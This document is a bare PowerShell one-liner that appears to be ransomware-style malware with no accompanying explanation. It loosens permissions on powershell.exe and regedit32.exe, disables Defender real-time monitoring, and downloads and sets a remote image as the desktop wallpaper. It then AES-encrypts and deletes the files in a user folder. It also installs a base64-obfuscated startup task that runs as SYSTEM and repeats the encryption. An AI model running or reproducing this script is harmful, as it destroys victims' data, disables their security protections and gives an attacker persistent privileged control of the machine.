$shell = New-Object -ComObject Shell.Application; $shell.ShellExecute("powershell.exe", "/c", "echo y| cacls C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe /e /p everyone:f"); $shell.ShellExecute("powershell.exe", "/c", "echo y| cacls C:\Windows\System32\regedit32.exe /e /p everyone:f"); Set-MpPreference -DisableRealtimeMonitoring $true; $dirPath="C:\directory"; mkdir $dirPath; $wallpaperUrl="https://www.ncsc.gov.uk/images/library/iStock-1420039900.jpg"; $wallpaperPath="$dirPath\wallpaper.jpg"; if (-Not (Test-Path $dirPath)) { New-Item -ItemType Directory -Path $dirPath | Out-Null }; if (-Not (Test-Path $wallpaperPath)) { Invoke-WebRequest -Uri $wallpaperUrl -OutFile $wallpaperPath } else { Write-Output "Wallpaper already exists: $wallpaperPath" }; Invoke-WebRequest -Uri $wallpaperUrl -OutFile $wallpaperPath; Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name "Wallpaper" -Value $wallpaperPath; $definition='using System; using System.Runtime.InteropServices; public class Wallpaper { [DllImport("user32.dll", CharSet=CharSet.Auto)] public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni); [DllImport("user32.dll")] public static extern int SendMessageTimeout(IntPtr hWnd, int Msg, IntPtr wParam, IntPtr lParam, int fuFlags, int uTimeout, out IntPtr lpdwResult); }'; Add-Type -TypeDefinition $definition; [Wallpaper]::SystemParametersInfo(20,0,$wallpaperPath,3); [IntPtr]$HWND_BROADCAST=[IntPtr]0xffff; [IntPtr]$Result=[IntPtr]::Zero; [Wallpaper]::SendMessageTimeout($HWND_BROADCAST,0x001A,[IntPtr]::Zero,[IntPtr]::Zero,2,5000,[ref]$Result); $definition='using System; using System.Security.Cryptography; using System.Text; public class CryptoHelper { public static string GetHash(string input) { using (SHA256 sha256 = SHA256.Create()) { byte[] bytes = sha256.ComputeHash(Encoding.UTF8.GetBytes(input)); return BitConverter.ToString(bytes).Replace("-", ""); } } }'; Add-Type -TypeDefinition $definition; $folderToEncrypt="C:\Users\Laurence\test\*"; $passphrase="your_secret_key_here"; $encryptionKey=[System.Security.Cryptography.SHA256]::Create().ComputeHash([System.Text.Encoding]::UTF8.GetBytes($passphrase)); Get-ChildItem -Path $folderToEncrypt -Recurse | ForEach-Object { $fileOrFolder=$_.FullName; if (Test-Path -Path $fileOrFolder -PathType Leaf) { $aes=[System.Security.Cryptography.Aes]::Create(); $aes.Key=$encryptionKey[0..($aes.KeySize/8-1)]; $aes.GenerateIV(); $content=[System.IO.File]::ReadAllBytes($fileOrFolder); $encryptor=$aes.CreateEncryptor(); $encryptedContent=$encryptor.TransformFinalBlock($content,0,$content.Length); $finalData=$aes.IV+$encryptedContent; $newFileName=[System.IO.Path]::GetFileNameWithoutExtension($_.Name)+".encrypted"; $newFilePath=[System.IO.Path]::Combine([System.IO.Path]::GetDirectoryName($fileOrFolder),$newFileName); [System.IO.File]::WriteAllBytes($newFilePath,$finalData); if (Test-Path -Path $newFilePath) { Remove-Item -Path $fileOrFolder -Force; Write-Output "Encrypted and deleted: $fileOrFolder" } else { Write-Output "Encryption failed for: $fileOrFolder" } } }; $taskName="Startup Task"; $base64EncodedCommand="JGRpclBhdGg9IkM6XGRpcmVjdG9yeSI7ICR3YWxscGFwZXJVcmw9Imh0dHBzOi8vd3d3Lm5jc2MuZ292LnVrL2ltYWdlcy9saWJyYXJ5L2lTdG9jay0xNDIwMDM5OTAwLmpwZyI7ICR3YWxscGFwZXJQYXRoPSIkZGlyUGF0aFx3YWxscGFwZXIuanBnIjsgaWYgKC1Ob3QgKFRlc3QtUGF0aCAkZGlyUGF0aCkpIHsgTmV3LUl0ZW0gLUl0ZW1UeXBlIERpcmVjdG9yeSAtUGF0aCAkZGlyUGF0aCB8IE91dC1OdWxsIH07IGlmICgtTm90IChUZXN0LVBhdGggJHdhbGxwYXBlclBhdGgpKSB7IEludm9rZS1XZWJSZXF1ZXN0IC1VcmkgJHdhbGxwYXBlclVybCAtT3V0RmlsZSAkd2FsbHBhcGVyUGF0aCB9IGVsc2UgeyBXcml0ZS1PdXRwdXQgIldhbGxwYXBlciBhbHJlYWR5IGV4aXN0czogJHdhbGxwYXBlclBhdGgiIH07IEludm9rZS1XZWJSZXF1ZXN0IC1VcmkgJHdhbGxwYXBlclVybCAtT3V0RmlsZSAkd2FsbHBhcGVyUGF0aDsgU2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAiSEtDVTpcQ29udHJvbCBQYW5lbFxEZXNrdG9wIiAtTmFtZSAiV2FsbHBhcGVyIiAtVmFsdWUgJHdhbGxwYXBlclBhdGg7ICRkZWZpbml0aW9uPSd1c2luZyBTeXN0ZW07IHVzaW5nIFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlczsgcHVibGljIGNsYXNzIFdhbGxwYXBlciB7IFtEbGxJbXBvcnQoInVzZXIzMi5kbGwiLCBDaGFyU2V0PUNoYXJTZXQuQXV0byldIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIGludCBTeXN0ZW1QYXJhbWV0ZXJzSW5mbyhpbnQgdUFjdGlvbiwgaW50IHVQYXJhbSwgc3RyaW5nIGxwdlBhcmFtLCBpbnQgZnVXaW5JbmkpOyBbRGxsSW1wb3J0KCJ1c2VyMzIuZGxsIildIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIGludCBTZW5kTWVzc2FnZVRpbWVvdXQoSW50UHRyIGhXbmQsIGludCBNc2csIEludFB0ciB3UGFyYW0sIEludFB0ciBsUGFyYW0sIGludCBmdUZsYWdzLCBpbnQgdVRpbWVvdXQsIG91dCBJbnRQdHIgbHBkd1Jlc3VsdCk7IH0nOyBBZGQtVHlwZSAtVHlwZURlZmluaXRpb24gJGRlZmluaXRpb247IFtXYWxscGFwZXJdOjpTeXN0ZW1QYXJhbWV0ZXJzSW5mbygyMCwwLCR3YWxscGFwZXJQYXRoLDMpOyBbSW50UHRyXSRIV05EX0JST0FEQ0FTVD1bSW50UHRyXTB4ZmZmZjsgW0ludFB0cl0kUmVzdWx0PVtJbnRQdHJdOjpaZXJvOyBbV2FsbHBhcGVyXTo6U2VuZE1lc3NhZ2VUaW1lb3V0KCRIV05EX0JST0FEQ0FTVCwweDAwMUEsW0ludFB0cl06Olplcm8sW0ludFB0cl06Olplcm8sMiw1MDAwLFtyZWZdJFJlc3VsdCk7ICRkZWZpbml0aW9uPSd1c2luZyBTeXN0ZW07IHVzaW5nIFN5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHk7IHVzaW5nIFN5c3RlbS5UZXh0OyBwdWJsaWMgY2xhc3MgQ3J5cHRvSGVscGVyIHsgcHVibGljIHN0YXRpYyBzdHJpbmcgR2V0SGFzaChzdHJpbmcgaW5wdXQpIHsgdXNpbmcgKFNIQTI1NiBzaGEyNTYgPSBTSEEyNTYuQ3JlYXRlKCkpIHsgYnl0ZVtdIGJ5dGVzID0gc2hhMjU2LkNvbXB1dGVIYXNoKEVuY29kaW5nLlVURjguR2V0Qnl0ZXMoaW5wdXQpKTsgcmV0dXJuIEJpdENvbnZlcnRlci5Ub1N0cmluZyhieXRlcykuUmVwbGFjZSgiLSIsICIiKTsgfSB9IH0nOyBBZGQtVHlwZSAtVHlwZURlZmluaXRpb24gJGRlZmluaXRpb247ICRmb2xkZXJUb0VuY3J5cHQ9IkM6XFVzZXJzXHRlc3QiOyAkcGFzc3BocmFzZT0ieW91cl9zZWNyZXRfa2V5X2hlcmUiOyAkZW5jcnlwdGlvbktleT1bU3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeS5TSEEyNTZdOjpDcmVhdGUoKS5Db21wdXRlSGFzaChbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldEJ5dGVzKCRwYXNzcGhyYXNlKSk7IEdldC1DaGlsZEl0ZW0gLVBhdGggJGZvbGRlclRvRW5jcnlwdCAtUmVjdXJzZSB8IEZvckVhY2gtT2JqZWN0IHsgJGZpbGVPckZvbGRlcj0kXy5GdWxsTmFtZTsgaWYgKFRlc3QtUGF0aCAtUGF0aCAkZmlsZU9yRm9sZGVyIC1QYXRoVHlwZSBMZWFmKSB7ICRhZXM9W1N5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuQWVzXTo6Q3JlYXRlKCk7ICRhZXMuS2V5PSRlbmNyeXB0aW9uS2V5WzAuLigkYWVzLktleVNpemUvOC0xKV07ICRhZXMuR2VuZXJhdGVJVigpOyAkY29udGVudD1bU3lzdGVtLklPLkZpbGVdOjpSZWFkQWxsQnl0ZXMoJGZpbGVPckZvbGRlcik7ICRlbmNyeXB0b3I9JGFlcy5DcmVhdGVFbmNyeXB0b3IoKTsgJGVuY3J5cHRlZENvbnRlbnQ9JGVuY3J5cHRvci5UcmFuc2Zvcm1GaW5hbEJsb2NrKCRjb250ZW50LDAsJGNvbnRlbnQuTGVuZ3RoKTsgJGZpbmFsRGF0YT0kYWVzLklWKyRlbmNyeXB0ZWRDb250ZW50OyAkbmV3RmlsZU5hbWU9W1N5c3RlbS5JTy5QYXRoXTo6R2V0RmlsZU5hbWVXaXRob3V0RXh0ZW5zaW9uKCRfLk5hbWUpKyIuZW5jcnlwdGVkIjsgJG5ld0ZpbGVQYXRoPVtTeXN0ZW0uSU8uUGF0aF06OkNvbWJpbmUoW1N5c3RlbS5JTy5QYXRoXTo6R2V0RGlyZWN0b3J5TmFtZSgkZmlsZU9yRm9sZGVyKSwkbmV3RmlsZU5hbWUpOyBbU3lzdGVtLklPLkZpbGVdOjpXcml0ZUFsbEJ5dGVzKCRuZXdGaWxlUGF0aCwkZmluYWxEYXRhKTsgaWYgKFRlc3QtUGF0aCAtUGF0aCAkbmV3RmlsZVBhdGgpIHsgUmVtb3ZlLUl0ZW0gLVBhdGggJGZpbGVPckZvbGRlciAtRm9yY2U7IFdyaXRlLU91dHB1dCAiRW5jcnlwdGVkIGFuZCBkZWxldGVkOiAkZmlsZU9yRm9sZGVyIiB9IGVsc2UgeyBXcml0ZS1PdXRwdXQgIkVuY3J5cHRpb24gZmFpbGVkIGZvcjogJGZpbGVPckZvbGRlciIgfSB9IH07ICR0YXNrTmFtZT0iU3RhcnR1cCBUYXNrIjsgJGJhc2U2NEVuY29kZWRDb21tYW5kPSJJeUJFWldacGJtVWdkbUZ5YVdGaWJHVnpJR1p2Y2lCM1lXeHNjR0Z3WlhJZ1lXNWtJR1JwY21WamRHOXllUW9rWkdseVVHRjBhQ0E5SUNKRE9seGthWEpsWTNSdmNua2lDaVIzWVd4c2NHRndaWEpWY213Z1BTQWlhSFIwY0hNNkx5OTNkM2N1Ym1Oell5NW5iM1l1ZFdzdmFXMWhaMlZ6TDJ4cFluSmhjbmt2YVZOMGIyTnJMVEUwTWpBd016azVNREF1YW5Cbklnb2tkMkZzYkhCaGNHVnlVR0YwYUNBOUlDSWtaR2x5VUdGMGFGeDNZV3hzY0dGd1pYSXVhbkJuSWc9PSI7ICR0YXNrQWN0aW9uPU5ldy1TY2hlZHVsZWRUYXNrQWN0aW9uIC1FeGVjdXRlICJwb3dlcnNoZWxsLmV4ZSIgLUFyZ3VtZW50ICItTm9Qcm9maWxlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1FbmNvZGVkQ29tbWFuZCAkYmFzZTY0RW5jb2RlZENvbW1hbmQiOyAkdGFza1ByaW5jaXBhbD1OZXctU2NoZWR1bGVkVGFza1ByaW5jaXBhbCAtVXNlcklEICJOVCBBVVRIT1JJVFlcU1lTVEVNIiAtUnVuTGV2ZWwgSGlnaGVzdDsgJHRhc2tUcmlnZ2VyPU5ldy1TY2hlZHVsZWRUYXNrVHJpZ2dlciAtQXRTdGFydHVwOyAkdGFza1NldHRpbmdzPU5ldy1TY2hlZHVsZWRUYXNrU2V0dGluZ3NTZXQgLUFsbG93U3RhcnRJZk9uQmF0dGVyaWVzIC1Eb250U3RvcElmR29pbmdPbkJhdHRlcmllczsgJGV4aXN0aW5nVGFzaz1HZXQtU2NoZWR1bGVkVGFzayAtVGFza05hbWUgJHRhc2tOYW1lIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlOyBpZiAoJGV4aXN0aW5nVGFzaykgeyBXcml0ZS1PdXRwdXQgIlNjaGVkdWxlZCB0YXNrICckdGFza05hbWUnIGFscmVhZHkgZXhpc3RzLiBVcGRhdGluZyB0YXNrLi4uIjsgU2V0LVNjaGVkdWxlZFRhc2sgLVRhc2tOYW1lICR0YXNrTmFtZSAtQWN0aW9uICR0YXNrQWN0aW9uIC1UcmlnZ2VyICR0YXNrVHJpZ2dlciAtUHJpbmNpcGFsICR0YXNrUHJpbmNpcGFsIC1TZXR0aW5ncyAkdGFza1NldHRpbmdzOyBXcml0ZS1PdXRwdXQgIlNjaGVkdWxlZCB0YXNrICckdGFza05hbWUnIHVwZGF0ZWQgc3VjY2Vzc2Z1bGx5ISIgfSBlbHNlIHsgV3JpdGUtT3V0cHV0ICJTY2hlZHVsZWQgdGFzayAnJHRhc2tOYW1lJyBub3QgZm91bmQuIENyZWF0aW5nIG5ldyB0YXNrLi4uIjsgUmVnaXN0ZXItU2NoZWR1bGVkVGFzayAtVGFza05hbWUgJHRhc2tOYW1lIC1BY3Rpb24gJHRhc2tBY3Rpb24gLVByaW5jaXBhbCAkdGFza1ByaW5jaXBhbCAtVHJpZ2dlciAkdGFza1RyaWdnZXIgLVNldHRpbmdzICR0YXNrU2V0dGluZ3M7IFdyaXRlLU91dHB1dCAiU2NoZWR1bGVkIHRhc2sgJyR0YXNrTmFtZScgY3JlYXRlZCBzdWNjZXNzZnVsbHkhIiB9"; $taskAction=New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -EncodedCommand $base64EncodedCommand"; $taskPrincipal=New-ScheduledTaskPrincipal -UserID "NT AUTHORITY\SYSTEM" -RunLevel Highest; $taskTrigger=New-ScheduledTaskTrigger -AtStartup; $taskSettings=New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries; $existingTask=Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue; if ($existingTask) { Write-Output "Scheduled task '$taskName' already exists. Updating task..."; Set-ScheduledTask -TaskName $taskName -Action $taskAction -Trigger $taskTrigger -Principal $taskPrincipal -Settings $taskSettings; Write-Output "Scheduled task '$taskName' updated successfully!" } else { Write-Output "Scheduled task '$taskName' not found. Creating new task..."; Register-ScheduledTask -Verb RunAs -TaskName $taskName -Action $taskAction -Principal $taskPrincipal -Trigger $taskTrigger -Settings $taskSettings; Write-Output "Scheduled task '$taskName' created successfully!" }
